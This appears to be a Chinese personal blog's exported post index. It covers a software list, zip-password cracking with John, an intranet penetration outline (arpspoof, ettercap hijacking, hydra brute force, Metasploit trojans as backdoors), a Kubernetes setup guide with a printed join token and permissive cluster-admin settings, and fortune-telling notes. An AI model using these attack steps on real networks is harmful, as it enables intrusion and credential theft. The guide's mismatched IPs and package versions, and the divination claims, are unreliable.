<h2 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a>社会工程学</h2><p>社工库</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>web安全攻防</category>
      </categories>
      <tags>
        <tag>web信息收集</tag>
        <tag>web安全攻防笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>windows-好用软件</title>
    <url>/2025/02/24/windows-%E5%A5%BD%E7%94%A8%E8%BD%AF%E4%BB%B6/</url>
    <content><![CDATA[<h2 id="U盘工具"><a href="#U盘工具" class="headerlink" title="U盘工具"></a>U盘工具</h2><h3 id="rufus"><a href="#rufus" class="headerlink" title="rufus"></a>rufus</h3><blockquote>
<p>下载地址：<br><a href="https://rufus.ie/zh/">https://rufus.ie/zh/</a></p>
</blockquote>
<hr>
<h2 id="解压"><a href="#解压" class="headerlink" title="解压"></a>解压</h2><h3 id="7zip"><a href="#7zip" class="headerlink" title="7zip"></a>7zip</h3><blockquote>
<p>下载地址：<br><a href="https://www.7-zip.org/">https://www.7-zip.org/</a></p>
</blockquote>
<hr>
<h2 id="ssh远程工具"><a href="#ssh远程工具" class="headerlink" title="ssh远程工具"></a>ssh远程工具</h2><h3 id="mobaxterm"><a href="#mobaxterm" class="headerlink" title="mobaxterm"></a>mobaxterm</h3><blockquote>
<p>下载地址：<br><a href="https://mobaxterm.mobatek.net/download.html">https://mobaxterm.mobatek.net/download.html</a></p>
</blockquote>
<hr>
<h2 id="ps手柄驱动"><a href="#ps手柄驱动" class="headerlink" title="ps手柄驱动"></a>ps手柄驱动</h2><h3 id="ds4-windows"><a href="#ds4-windows" class="headerlink" title="ds4-windows"></a>ds4-windows</h3><p>windows使用ps手柄，会和steam手柄识别冲突</p>
<blockquote>
<p>下载地址：<br><a href="https://ds4-windows.com/download/ryochan7-ds4windows/">https://ds4-windows.com/download/ryochan7-ds4windows/</a></p>
</blockquote>
<hr>
<h2 id="远程同屏游戏"><a href="#远程同屏游戏" class="headerlink" title="远程同屏游戏"></a>远程同屏游戏</h2><h3 id="Parsec"><a href="#Parsec" class="headerlink" title="Parsec"></a>Parsec</h3><blockquote>
<p>下载地址：<br><a href="https://parsec.app/downloads">https://parsec.app/downloads</a></p>
</blockquote>
<hr>
<h2 id="文件检索"><a href="#文件检索" class="headerlink" title="文件检索"></a>文件检索</h2><h3 id="everything"><a href="#everything" class="headerlink" title="everything"></a>everything</h3><blockquote>
<p>下载地址：<br><a href="https://www.voidtools.com/zh-cn/downloads/">https://www.voidtools.com/zh-cn/downloads/</a></p>
</blockquote>
<hr>
<h2 id="控制手机"><a href="#控制手机" class="headerlink" title="控制手机"></a>控制手机</h2><h3 id="anlink"><a href="#anlink" class="headerlink" title="anlink"></a>anlink</h3><blockquote>
<p>下载地址：（或者windows商店）<br><a href="https://cn.anlinksoft.com/">https://cn.anlinksoft.com/</a></p>
</blockquote>
<hr>
<h2 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h2><h3 id="universal-ftp-server"><a href="#universal-ftp-server" class="headerlink" title="universal ftp server"></a>universal ftp server</h3><blockquote>
<p>下载地址：<br>windows应用商店</p>
</blockquote>
<hr>
<h2 id="壁纸"><a href="#壁纸" class="headerlink" title="壁纸"></a>壁纸</h2><h3 id="小红车"><a href="#小红车" class="headerlink" title="小红车"></a>小红车</h3><blockquote>
<p>下载地址：<br>steam搜索 <strong>Wallpaper Engine</strong></p>
</blockquote>
<h3 id="wallhaven网站"><a href="#wallhaven网站" class="headerlink" title="wallhaven网站"></a>wallhaven网站</h3><blockquote>
<p>地址：<br><a href="https://wallhaven.cc/">https://wallhaven.cc/</a></p>
</blockquote>
<hr>
<h2 id="视频文件"><a href="#视频文件" class="headerlink" title="视频文件"></a>视频文件</h2><h3 id="VLC"><a href="#VLC" class="headerlink" title="VLC"></a>VLC</h3><blockquote>
<p>下载地址：（或者windows商店）<br><a href="https://www.videolan.org/vlc/index.zh_CN.html">https://www.videolan.org/vlc/index.zh_CN.html</a></p>
</blockquote>
<hr>
<h2 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h2><h3 id="VM"><a href="#VM" class="headerlink" title="VM"></a>VM</h3><blockquote>
<p>下载地址：<br><a href="https://www.vmware.com/products/desktop-hypervisor/workstation-and-fusion#product-overview">https://www.vmware.com/products/desktop-hypervisor/workstation-and-fusion#product-overview</a></p>
</blockquote>
<hr>
]]></content>
      <categories>
        <category>好用软件</category>
      </categories>
      <tags>
        <tag>资源</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>压缩包密码爆破</title>
    <url>/2024/08/10/%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/</url>
    <content><![CDATA[<h2 id="使用zip2john-hash值破解"><a href="#使用zip2john-hash值破解" class="headerlink" title="使用zip2john hash值破解"></a>使用zip2john hash值破解</h2><p>生成压缩包hash值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zip2john filename.zip &gt; hash.txt</span><br></pre></td></tr></table></figure>
<p>开始破解</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">john hash.txt</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>网络安全</category>
        <category>kali</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>kali</tag>
        <tag>hashcat</tag>
      </tags>
  </entry>
  <entry>
    <title>安全-内网渗透</title>
    <url>/2024/08/01/%E5%AE%89%E5%85%A8-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>主机存活<br>    ettercap -G 蜘蛛<br>    nmap<br>    nmap -sS 网段</p>
<p>漏洞搜集<br>    awvs			网站扫描<br>    gvm(openvas)	系统扫描<br>    nmap<br>    nmap –script&#x3D;vuln &#x2F;&#x2F;常见漏洞<br>    nmap –script-default &#x2F;&#x2F;默认收集信息脚本</p>
<h2 id="进入目标后"><a href="#进入目标后" class="headerlink" title="进入目标后"></a>进入目标后</h2><p>提权<br>    创建高权限用户<br>        windows<br>            net use<br>        linux<br>            user add</p>
<p>留后门<br>    创建木马<br>        木马(msfconsole)<br>    上传木马<br>        meterpreter<br>            upload</p>
<h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><p>改变流量走向<br>    ettercap(arp欺骗、dns劫持等)<br>    arpspoof<br>    arpspoof -i 网卡名称 -t 目标IP 网关</p>
<p>爆破密码<br>    hydra（九头蛇）<br>    msfconsole（爆破密码模块）</p>
<p>漏洞攻击<br>    msfconsole（漏洞攻击目录）</p>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>kali</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>生成密钥 ssh-keygen命令</title>
    <url>/2024/08/13/%E7%94%9F%E6%88%90%E5%AF%86%E9%92%A5-ssh-keygen%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h3 id="生成一个密钥文件"><a href="#生成一个密钥文件" class="headerlink" title="生成一个密钥文件"></a>生成一个密钥文件</h3><p>   生成一个 2048 位的 RSA 密钥对，并将私钥存储在 ~&#x2F;.ssh&#x2F;id_rsa 中，将公钥存储在 ~&#x2F;.ssh&#x2F;id_rsa.pub 中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -b 2048 -f ~/.ssh/id_rsa</span><br></pre></td></tr></table></figure>
<h3 id="示例详解"><a href="#示例详解" class="headerlink" title="示例详解"></a>示例详解</h3><p>-t rsa: 指定要生成的密钥类型为 RSA。RSA 是一种非对称加密算法，常用于生成 SSH 密钥对。</p>
<p>-b 2048: 指定生成的密钥的比特数。在这里，生成的密钥将有 2048 位。密钥位数越大，通常越安全，但也会增加计算负担。</p>
<p>-f ~&#x2F;.ssh&#x2F;id_rsa: 指定生成的密钥文件的路径。在这里，生成的私钥将存储在 ~&#x2F;.ssh&#x2F;id_rsa 文件中，而公钥则存储在 ~&#x2F;.ssh&#x2F;id_rsa.pub 文件中。这是默认的文件路径，可以根据需要指定其他路径。</p>
<h2 id="参数表格"><a href="#参数表格" class="headerlink" title="参数表格"></a>参数表格</h2><table>
<thead>
<tr>
<th align="center">参数</th>
<th align="left">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center">-b</td>
<td align="left">指定密钥长度；</td>
</tr>
<tr>
<td align="center">-e</td>
<td align="left">读取openssh的私钥或者公钥文件；</td>
</tr>
<tr>
<td align="center">-C</td>
<td align="left">添加注释；</td>
</tr>
<tr>
<td align="center">-f</td>
<td align="left">指定用来保存密钥的文件名；</td>
</tr>
<tr>
<td align="center">-i</td>
<td align="left">读取未加密的ssh-v2兼容的私钥&#x2F;公钥文件，然后在标准输出设备上显示openssh兼容的私钥&#x2F;公钥；</td>
</tr>
<tr>
<td align="center">-l</td>
<td align="left">显示公钥文件的指纹数据；</td>
</tr>
<tr>
<td align="center">-N</td>
<td align="left">提供一个新密语；</td>
</tr>
<tr>
<td align="center">-P</td>
<td align="left">提供（旧）密语；</td>
</tr>
<tr>
<td align="center">-q</td>
<td align="left">静默模式；</td>
</tr>
<tr>
<td align="center">-t</td>
<td align="left">指定要创建的密钥类型。</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>系统运维</category>
        <category>linux</category>
        <category>命令</category>
      </categories>
      <tags>
        <tag>linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title>笔记本无线网卡异常</title>
    <url>/2025/03/22/%E7%AC%94%E8%AE%B0%E6%9C%AC%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1%E5%BC%82%E5%B8%B8/</url>
    <content><![CDATA[<h2 id="问题现象"><a href="#问题现象" class="headerlink" title="问题现象"></a>问题现象</h2><p>这次遇到的问题现象是一开始网卡会时不时异常，通过重启和去除静电的方法会恢复正常，但是突然有一天就开始无法恢复了，始终保持异常的状态，怎么重新安装驱动都没用。</p>
<p>但是主机是一直有识别到网卡的，设备管理显示黄色告警。</p>
<h2 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h2><h3 id="拆机拔插网卡"><a href="#拆机拔插网卡" class="headerlink" title="拆机拔插网卡"></a>拆机拔插网卡</h3><p>网卡拆下来用纸巾擦干净，或者酒精，重新安装即恢复</p>
<p><del>原本是一直用手机usb共享网络使用网络了，但是有一天突然想到小时候的小霸王游戏卡都是擦擦金手指解决的， 尝试后没想到真有用</del></p>
<blockquote>
<p>这个是我这次的问题解决办法，正常解决途径有以下方法</p>
</blockquote>
<h3 id="去除静电"><a href="#去除静电" class="headerlink" title="去除静电"></a>去除静电</h3><ol>
<li>拔掉电脑上所有的线</li>
<li>启动键一直按，按到关机后再按20秒</li>
</ol>
<p>操作成功后启动我的联想y7000键盘灯会是熄灭的</p>
<h3 id="更新-重新下载网卡驱动"><a href="#更新-重新下载网卡驱动" class="headerlink" title="更新&#x2F;重新下载网卡驱动"></a>更新&#x2F;重新下载网卡驱动</h3><ul>
<li>使用intel网卡驱动自动检测下载工具<blockquote>
<p>下载地址：<br><a href="https://www.intel.cn/content/www/cn/zh/download/19351/intel-wireless-wi-fi-drivers-for-windows-10-and-windows-11.html">https://www.intel.cn/content/www/cn/zh/download/19351/intel-wireless-wi-fi-drivers-for-windows-10-and-windows-11.html</a><br>其他驱动：<br><a href="https://www.intel.cn/content/www/cn/zh/download-center/home.html">https://www.intel.cn/content/www/cn/zh/download-center/home.html</a></p>
</blockquote>
</li>
</ul>
]]></content>
      <categories>
        <category>笔记本维修</category>
      </categories>
      <tags>
        <tag>笔记本无线网卡</tag>
        <tag>维修</tag>
      </tags>
  </entry>
  <entry>
    <title>简单部署k8s</title>
    <url>/2024/08/15/%E7%AE%80%E5%8D%95%E9%83%A8%E7%BD%B2k8s/</url>
    <content><![CDATA[<h2 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h2><h3 id="服务器规划："><a href="#服务器规划：" class="headerlink" title="服务器规划："></a>服务器规划：</h3><table>
<thead>
<tr>
<th align="center">角色</th>
<th align="center">IP地址</th>
</tr>
</thead>
<tbody><tr>
<td align="center">k8s-master</td>
<td align="center">192.168.11.130</td>
</tr>
<tr>
<td align="center">k8s-node1</td>
<td align="center">192.168.11.134</td>
</tr>
<tr>
<td align="center">k8s-node2</td>
<td align="center">192.168.11.135</td>
</tr>
</tbody></table>
<h3 id="服务器要求："><a href="#服务器要求：" class="headerlink" title="服务器要求："></a>服务器要求：</h3><p>建议最小硬件配置：2核CPU、2G内存、20G硬盘。<br>服务器可以访问互联网，会联网下载镜像。<br>软件环境：</p>
<table>
<thead>
<tr>
<th align="center">软件</th>
<th align="center">版本</th>
</tr>
</thead>
<tbody><tr>
<td align="center">操作系统</td>
<td align="center">CentOS7.9_x64</td>
</tr>
<tr>
<td align="center">Docker</td>
<td align="center">24.0.0（CE）</td>
</tr>
<tr>
<td align="center">Kubernetes</td>
<td align="center">1.28</td>
</tr>
</tbody></table>
<h2 id="初始化配置"><a href="#初始化配置" class="headerlink" title="初始化配置"></a>初始化配置</h2><h3 id="关闭-Selinux"><a href="#关闭-Selinux" class="headerlink" title="关闭 Selinux"></a>关闭 Selinux</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sed -i &#x27;s/enforcing/disabled/&#x27; /etc/selinux/config # 永久</span><br><span class="line">setenforce 0 # 临时</span><br></pre></td></tr></table></figure>
<h3 id="关闭-Swap"><a href="#关闭-Swap" class="headerlink" title="关闭 Swap"></a>关闭 Swap</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">swapoff -a # 临时</span><br><span class="line">sed -ri &#x27;s/.*swap.*/#&amp;/&#x27; /etc/fstab # 永久</span><br></pre></td></tr></table></figure>
<h3 id="设置主机名"><a href="#设置主机名" class="headerlink" title="设置主机名"></a>设置主机名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hostnamectl set-hostname k8s-master</span><br></pre></td></tr></table></figure>
<h3 id="确保网络桥接的数据包经过-Iptables-处理，启用相关的内核参数"><a href="#确保网络桥接的数据包经过-Iptables-处理，启用相关的内核参数" class="headerlink" title="确保网络桥接的数据包经过 Iptables 处理，启用相关的内核参数"></a>确保网络桥接的数据包经过 Iptables 处理，启用相关的内核参数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat &gt; /etc/sysctl.d/k8s.conf &lt;&lt; EOF</span><br><span class="line">net.bridge.bridge-nf-call-ip6tables = 1</span><br><span class="line">net.bridge.bridge-nf-call-iptables = 1</span><br><span class="line">EOF</span><br><span class="line">sysctl --system # 生效</span><br></pre></td></tr></table></figure>
<h2 id="安装-Docker"><a href="#安装-Docker" class="headerlink" title="安装 Docker"></a>安装 Docker</h2><h3 id="下载安装"><a href="#下载安装" class="headerlink" title="下载安装"></a>下载安装</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo -O /etc/yum.repos.d/docker-ce.repo</span><br><span class="line">yum -y install docker-ce</span><br><span class="line">systemctl enable docker &amp;&amp; systemctl start docker</span><br></pre></td></tr></table></figure>
<h3 id="配置镜像下载加速器和设置-Cgroup-驱动"><a href="#配置镜像下载加速器和设置-Cgroup-驱动" class="headerlink" title="配置镜像下载加速器和设置 Cgroup 驱动"></a>配置镜像下载加速器和设置 Cgroup 驱动</h3><p>这一步可以参考最新的docker可用镜像源设置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat &gt; /etc/docker/daemon.json &lt;&lt; EOF</span><br><span class="line"> &#123;</span><br><span class="line"> &quot;registry-mirrors&quot;: [&quot;https://b9pmyelo.mirror.aliyuncs.com&quot;],</span><br><span class="line"> &quot;exec-opts&quot;: [&quot;native.cgroupdriver=systemd&quot;]</span><br><span class="line"> &#125;</span><br><span class="line">EOF</span><br><span class="line">systemctl restart docker</span><br><span class="line">docker info</span><br></pre></td></tr></table></figure>
<h3 id="安装-cri-dockerd（Docker-与-Kubernetes-通信的中间程序）"><a href="#安装-cri-dockerd（Docker-与-Kubernetes-通信的中间程序）" class="headerlink" title="安装 cri-dockerd（Docker 与 Kubernetes 通信的中间程序）"></a>安装 cri-dockerd（Docker 与 Kubernetes 通信的中间程序）</h3><p>测试最新版本0.3.15安装在centos7.9缺少依赖，但是显示的依赖包已安装，安装旧一版本0.3.14没什么问题，可能版本和我最简的centos7.9有些问题，下载地址为：<br><a href="https://github.com/Mirantis/cri-dockerd/releases">https://github.com/Mirantis/cri-dockerd/releases</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://github.com/Mirantis/cri-dockerd/releases/download/v0.3.14/cri-dockerd-0.3.14-3.el7.x86_64.rpm</span><br><span class="line">rpm -ivh cri-dockerd-0.3.2-3.el7.x86_64.rpm</span><br></pre></td></tr></table></figure>
<h3 id="指定依赖镜像地址为国内镜像地址："><a href="#指定依赖镜像地址为国内镜像地址：" class="headerlink" title="指定依赖镜像地址为国内镜像地址："></a>指定依赖镜像地址为国内镜像地址：</h3><p>修改ExecStart&#x3D;&#x2F;usr&#x2F;bin&#x2F;cri-dockerd –container-runtime-endpoint fd:&#x2F;&#x2F;部分，添加以下参数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi /usr/lib/systemd/system/cri-docker.service</span><br><span class="line">ExecStart=/usr/bin/cri-dockerd --container-runtime-endpoint fd:// --pod-infra-container-image=registry.aliyuncs.com/google_containers/pause:3.9</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl enable cri-docker &amp;&amp; systemctl start cri-docker</span><br></pre></td></tr></table></figure>
<h2 id="部署-Kubernetes-集群"><a href="#部署-Kubernetes-集群" class="headerlink" title="部署 Kubernetes 集群"></a>部署 Kubernetes 集群</h2><h3 id="添加阿里云-YUM-软件源"><a href="#添加阿里云-YUM-软件源" class="headerlink" title="添加阿里云 YUM 软件源"></a>添加阿里云 YUM 软件源</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat &gt; /etc/yum.repos.d/kubernetes.repo &lt;&lt; EOF</span><br><span class="line">[kubernetes]</span><br><span class="line">name=Kubernetes</span><br><span class="line">baseurl=https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64</span><br><span class="line">enabled=1</span><br><span class="line">gpgcheck=0</span><br><span class="line">repo_gpgcheck=0</span><br><span class="line">gpgkey=https://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg https://mirrors.ali</span><br><span class="line">yun.com/kubernetes/yum/doc/rpm-package-key.gpg</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>
<h3 id="安装-kubeadm，kubelet-和-kubectl"><a href="#安装-kubeadm，kubelet-和-kubectl" class="headerlink" title="安装 kubeadm，kubelet 和 kubectl"></a>安装 kubeadm，kubelet 和 kubectl</h3><p>我一般默认安装最新版yum install -y kubelet kubeadm kubectl，这里我指定下版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install -y kubelet-1.28.2 kubeadm-1.28.2 kubectl-1.28.2</span><br><span class="line">systemctl enable kubelet</span><br></pre></td></tr></table></figure>
<h3 id="初始化-Master-节点"><a href="#初始化-Master-节点" class="headerlink" title="初始化 Master 节点"></a>初始化 Master 节点</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubeadm init \</span><br><span class="line">--apiserver-advertise-address=192.168.11.128 \</span><br><span class="line">--image-repository registry.aliyuncs.com/google_containers \</span><br><span class="line">--kubernetes-version v1.28.2 \</span><br><span class="line">--service-cidr=10.96.0.0/12 \</span><br><span class="line">--pod-network-cidr=10.244.0.0/16 \</span><br><span class="line">--cri-socket=unix:///var/run/cri-dockerd.sock</span><br></pre></td></tr></table></figure>
<p>初始化完成后，根据提示信息，拷贝 kubectl 工具认证文件到默认路径：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir -p $HOME/.kube</span><br><span class="line">sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config</span><br><span class="line">sudo chown $(id -u):$(id -g) $HOME/.kube/config</span><br></pre></td></tr></table></figure>
<p>使用 kubectl 工具查看节点状态：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl get nodes</span><br></pre></td></tr></table></figure>
<p>ps:由于网络插件还没有部署，节点会处于“NotReady”状态</p>
<h3 id="将-Node-节点加入集群"><a href="#将-Node-节点加入集群" class="headerlink" title="将 Node 节点加入集群"></a>将 Node 节点加入集群</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubeadm join 192.168.11.130:6443 --token pt332w.pz2sldn46h9ynfsw         --discovery-token-ca-cert-hash sha256:b6bdbc14bee762e5a7cfc24aa60cc842077180ae6595eb68b09d0333243cfa0c --cri-socket=unix:///var/run/cri-dockerd.sock</span><br></pre></td></tr></table></figure>
<h3 id="安装网络组件"><a href="#安装网络组件" class="headerlink" title="安装网络组件"></a>安装网络组件</h3><p>Pod 网络:Kubernetes 需要一个 Pod 网络插件来管理集群中的网络通信。你可以选择一个适合你环境的网络插件（如 Flannel、Calico、Weave 等），并使用 kubectl 命令来部署。</p>
<p>这里使用 Calico 作为 Kubernetes 的网络插件，负责集群中网络通信。<br>创建 Calico 网络组件的资源：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl apply -f https://docs.projectcalico.org/manifests/calico.yaml</span><br></pre></td></tr></table></figure>
<p>配置安全策略</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim network-policy.yaml</span><br><span class="line"></span><br><span class="line">apiVersion: networking.k8s.io/v1</span><br><span class="line">kind: NetworkPolicy</span><br><span class="line">metadata:</span><br><span class="line">  name: allow-all</span><br><span class="line">  namespace: default</span><br><span class="line">spec:</span><br><span class="line">  podSelector: &#123;&#125;</span><br><span class="line">  policyTypes:</span><br><span class="line">  - Ingress</span><br><span class="line">  - Egress</span><br><span class="line">  ingress:</span><br><span class="line">  - &#123;&#125;</span><br><span class="line">  egress:</span><br><span class="line">  - &#123;&#125;</span><br><span class="line"></span><br><span class="line">kubectl apply -f network-policy.yaml</span><br></pre></td></tr></table></figure>

<p>应用完成后，等待 5 分钟后，查看 Pod 运行状态：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl get pods -n kube-system</span><br></pre></td></tr></table></figure>
<p>如果出现问题，可能是还未下载完，也可以查看日志排查</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl logs -n kube-system &lt;pod-name&gt;</span><br></pre></td></tr></table></figure>
<p>ps：如果 Pod 处于“ContainerCreating”状态说明在下载镜像中，需耐心等待</p>
<h2 id="安装-Dashboard"><a href="#安装-Dashboard" class="headerlink" title="安装 Dashboard"></a>安装 Dashboard</h2><p>Dashboard 是官方提供的一个 UI，可用于基本管理 K8s 资源。</p>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl apply -f kubernetes-dashboard.yaml</span><br><span class="line">kubectl get pods -n kubernetes-dashboard</span><br></pre></td></tr></table></figure>
<p>浏览器访问“https:&#x2F;&#x2F;&lt;节点 IP 地址&gt;:30001”，将看到 Dashboard 登录界面。</p>
<h3 id="创建服务账号并授权管理员权限："><a href="#创建服务账号并授权管理员权限：" class="headerlink" title="创建服务账号并授权管理员权限："></a>创建服务账号并授权管理员权限：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 创建用户</span><br><span class="line">kubectl create serviceaccount dashboard-admin -n kubernetes-dashboard</span><br><span class="line"># 用户授权</span><br><span class="line">kubectl create clusterrolebinding dashboard-admin --clusterrole=cluster-admin --</span><br><span class="line">serviceaccount=kubernetes-dashboard:dashboard-admin</span><br><span class="line"># 获取用户 Token</span><br><span class="line">kubectl create token dashboard-admin -n kubernetes-dashboard</span><br></pre></td></tr></table></figure>

<p>使用输出的 Token 登录 Dashboard，将进入到首页<br>至此，k8s部署完成</p>
]]></content>
      <categories>
        <category>系统运维</category>
        <category>k8s</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>k8s</tag>
      </tags>
  </entry>
  <entry>
    <title>算命</title>
    <url>/2025/02/05/%E7%AE%97%E5%91%BD/</url>
    <content><![CDATA[<h2 id="六神"><a href="#六神" class="headerlink" title="六神"></a>六神</h2><h3 id="手势位置"><a href="#手势位置" class="headerlink" title="手势位置"></a>手势位置</h3><p>左手三指，分别是大安、流连、速喜、赤口、小吉、空亡<br><img src="/images/pasted-71.png" alt="upload successful"></p>
<p>速记：大、流、速、赤、小、空。</p>
<h3 id="详解"><a href="#详解" class="headerlink" title="详解"></a>详解</h3><h4 id="大安"><a href="#大安" class="headerlink" title="大安"></a>大安</h4><p>1、身不动时（如果算一个人在干什么）<br>2、五行：属木<br>3、方位：东<br>4、神煞：青龙<br>5、数字：1、5、7<br>6、安心吉祥的意思</p>
<p>口诀：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">大安事事昌</span><br><span class="line">求谋在东方</span><br><span class="line">失物去不远</span><br><span class="line">宅家保平安</span><br><span class="line">行人身未动</span><br><span class="line">病者主无妨</span><br><span class="line">将军回田野</span><br><span class="line">仔细更推详</span><br></pre></td></tr></table></figure>

<h4 id="留连"><a href="#留连" class="headerlink" title="留连"></a>留连</h4><p>1、人未归时<br>2、五行属水<br>3、黑色<br>4、方位北<br>5、玄武<br>6、数字：2、8、10<br>7、有暗昧不明、延迟、纠缠、拖延、漫长之意</p>
<p>口诀：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">留连事难成</span><br><span class="line">求谋日未明</span><br><span class="line">官事凡宜缓</span><br><span class="line">去者未回程</span><br><span class="line">失物南方见</span><br><span class="line">急讨方心称</span><br><span class="line">更须防口舌</span><br><span class="line">人口且平平</span><br></pre></td></tr></table></figure>

<h4 id="速喜"><a href="#速喜" class="headerlink" title="速喜"></a>速喜</h4><p>1、人即至时<br>2、五行属火<br>3、红色<br>4、方位为南方<br>5、数字：3,6,9<br>6、有快速、吉利、时机已到之意</p>
<p>口诀：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">速喜喜来临</span><br><span class="line">求财向南行</span><br><span class="line">失物申未午（南、西南）</span><br><span class="line">逢人路上寻</span><br><span class="line">官事有福德</span><br><span class="line">病者无祸侵</span><br><span class="line">田宅六畜吉</span><br><span class="line">行人有信音</span><br></pre></td></tr></table></figure>

<h4 id="赤口"><a href="#赤口" class="headerlink" title="赤口"></a>赤口</h4><p>1、官事凶时<br>2、五行属金<br>3、白色<br>4、西方<br>5、白虎<br>6、数字：4，7，10<br>7、有不吉、惊恐、凶险、口舌是非之意</p>
<p>口诀：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">赤口主口舌</span><br><span class="line">官非切宜防</span><br><span class="line">失物急去寻</span><br><span class="line">行人有惊慌</span><br><span class="line">鸡犬（六畜）多作怪</span><br><span class="line">病者出西方</span><br><span class="line">更须防咀咒</span><br><span class="line">诚恐染瘟皇</span><br></pre></td></tr></table></figure>

<h4 id="小吉"><a href="#小吉" class="headerlink" title="小吉"></a>小吉</h4><p>1、人来喜时<br>2、五行属木<br>3、六合<br>4、数字：1,5,7<br>5、有和合、吉利之意</p>
<p>口诀：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">小吉最吉昌</span><br><span class="line">路上好商量</span><br><span class="line">阴人来报喜</span><br><span class="line">失物在坤方（西南）</span><br><span class="line">行人即便至</span><br><span class="line">交易甚是强</span><br><span class="line">凡事皆和合</span><br><span class="line">病者祈上苍</span><br></pre></td></tr></table></figure>

<h4 id="空亡"><a href="#空亡" class="headerlink" title="空亡"></a>空亡</h4><p>1、音信稀时<br>2、五行属土<br>3、黄色<br>4、中央<br>5、勾陈<br>6、数字：3,6,9<br>7、有不吉、无果之意</p>
<p>口诀：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">空亡事不祥</span><br><span class="line">阴人多乖张</span><br><span class="line">求财无利益</span><br><span class="line">行人有灾殃</span><br><span class="line">失物寻一见</span><br><span class="line">官事有刑伤</span><br><span class="line">病人逢暗鬼</span><br><span class="line">祈解保安康</span><br></pre></td></tr></table></figure>

<h2 id="奇门"><a href="#奇门" class="headerlink" title="奇门"></a>奇门</h2><h3 id="九宫五行"><a href="#九宫五行" class="headerlink" title="九宫五行"></a>九宫五行</h3><p>五行生克关系<br><img src="/images/pasted-74.png" alt="upload successful"><br>九宫位置<br><img src="/images/pasted-73.png" alt="upload successful"><br>东南西北位置<br><img src="/images/pasted-75.png" alt="upload successful"></p>
<h2 id="干支"><a href="#干支" class="headerlink" title="干支"></a>干支</h2><p>甲乙东方木，丙丁南方火，戊己中央土，庚辛西方金，壬癸北方水</p>
<p>寅卯为木居东方，巳午为火居正南，<br>申酉属金位在西，子亥属水在北边，<br>辰戌丑未皆属土，分别居于四维偏，<br>辰在东南戌西北，丑在东北未西南。</p>
<h2 id="时辰"><a href="#时辰" class="headerlink" title="时辰"></a>时辰</h2><p>子丑寅卯辰巳午未申酉戌亥</p>
]]></content>
      <categories>
        <category>生活</category>
        <category>玄学</category>
      </categories>
      <tags>
        <tag>算命知识</tag>
        <tag>小六壬</tag>
      </tags>
  </entry>
  <entry>
